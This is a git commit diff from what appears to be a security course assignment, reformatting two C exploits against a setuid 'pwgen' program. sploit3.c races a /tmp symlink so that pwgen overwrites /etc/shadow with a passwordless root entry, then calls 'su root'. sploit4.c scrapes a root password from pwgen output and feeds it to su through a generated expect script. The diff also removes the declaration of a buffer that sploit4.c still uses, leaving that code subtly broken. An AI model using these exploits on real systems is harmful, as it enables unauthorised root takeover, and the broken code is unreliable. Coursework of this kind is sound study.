17eeeb2d0a72bd937bdacb2147d855eb0ffc8ffc
Zellccc <gory-killer@hotmail.com>
2018-01-30 10:12:18 -0500

    properly indent and delete unneccessary shit

--- Assignement 1/sploit3.c
+++ Assignement 1/sploit3.c
@@ -1,39 +1,33 @@
 /*
- * dummy exploit program
- */
+* dummy exploit program
+*/
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include </usr/local/src/shellcode.h>
 
-#define DBSIZE 562
-#define DOFFSET 0
 #define TARGET "/usr/local/bin/pwgen"
-#define NOP   0x90
 
 
 int main(int argc, char *argv[])
 {
   FILE *fp,*tmpfile;
   int i;
-   char changeshadow[] ="root::16565::::::";
- 
+  char changeshadow[] ="root::16565::::::";
 
- 
 
-   tmpfile = fopen("/tmp/fakefile","w");
-   fclose(tmpfile);
 
- //  symlink("/etc/shadow","/tmp/pwgen_entropy");
-  symlink("/tmp/fakefile","/tmp/pwgen_entropy");
-   fp = popen("/usr/local/bin/pwgen -e","w");
-   system("rm /tmp/pwgen_entropy -f");
-//   unlink("/tmp/pwgen_entrophy");
-   symlink("/etc/shadow","/tmp/pwgen_entropy");
-   fprintf(fp, "\n%s", changeshadow); 
-   fclose(fp);
-   system("su root");
-//printf("%s %s %s",args[0], args[1],  args[2]);
+
+  tmpfile = fopen("/tmp/fakefile","w");
+  fclose(tmpfile);
+
+  symlink("/tmp/fakefile","/tmp/pwgen_entropy");//link to my own fake file
+  fp = popen("/usr/local/bin/pwgen -e","w");//open the pwgen in another process
+  system("rm /tmp/pwgen_entropy -f");//rm old link file
+  symlink("/etc/shadow","/tmp/pwgen_entropy"); //link to shadow file
+  fprintf(fp, "\n%s", changeshadow);
+  fclose(fp);
+  system("su root");
   exit(0);
 }
--- Assignement 1/sploit4.c
+++ Assignement 1/sploit4.c
@@ -1,6 +1,6 @@
 /*
- * dummy exploit program
- */
+* dummy exploit program
+*/
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,34 +9,31 @@
 
 
 
-#define DBSIZE 562
-#define DOFFSET 0
 #define TARGET "/usr/local/bin/pwgen"
-#define NOP   0x90
 
 
 int main(int argc, char *argv[])
 {
-  
+
   int i;
-   FILE *targetprocess, *supro,*shellscript;
+  FILE *targetprocess, *supro,*shellscript;
   char passwdln[50];
   char passwd[10];
-  char bashscript[200] = "#!/usr/bin/expect -f\n spawn su root\n expect \"Password:\"\n send -- \"%s\r\" \n interact"; 
-  char test[200];  
-  
-  
-  
-  
+  char bashscript[200] = "#!/usr/bin/expect -f\n spawn su root\n expect \"Password:\"\n send -- \"%s\r\" \n interact";
+
+
+
+
+
   targetprocess = popen("USER=root /usr/local/bin/pwgen -w","r");
   fgets(passwdln ,50 , targetprocess);
   i =0;
-  while ((31+i) < strlen(passwdln)){
-  passwd[i] = passwdln[31+i]; //get password
-   i++; 
-   
-   }
-   passwd[6] = '\0';
+  while ((31+i) < strlen(passwdln)){//assuming password will always be 6 char
+    passwd[i] = passwdln[31+i]; //get password
+    i++;
+
+  }
+  passwd[6] = '\0';
   pclose(targetprocess);
   shellscript = fopen("tmpcode.sh","w+");
   sprintf(test, bashscript,passwd);
@@ -46,7 +43,7 @@ int main(int argc, char *argv[])
   system("./tmpcode.sh");
 
   //su to root
-  
-  
+
+
   exit(0);
 }
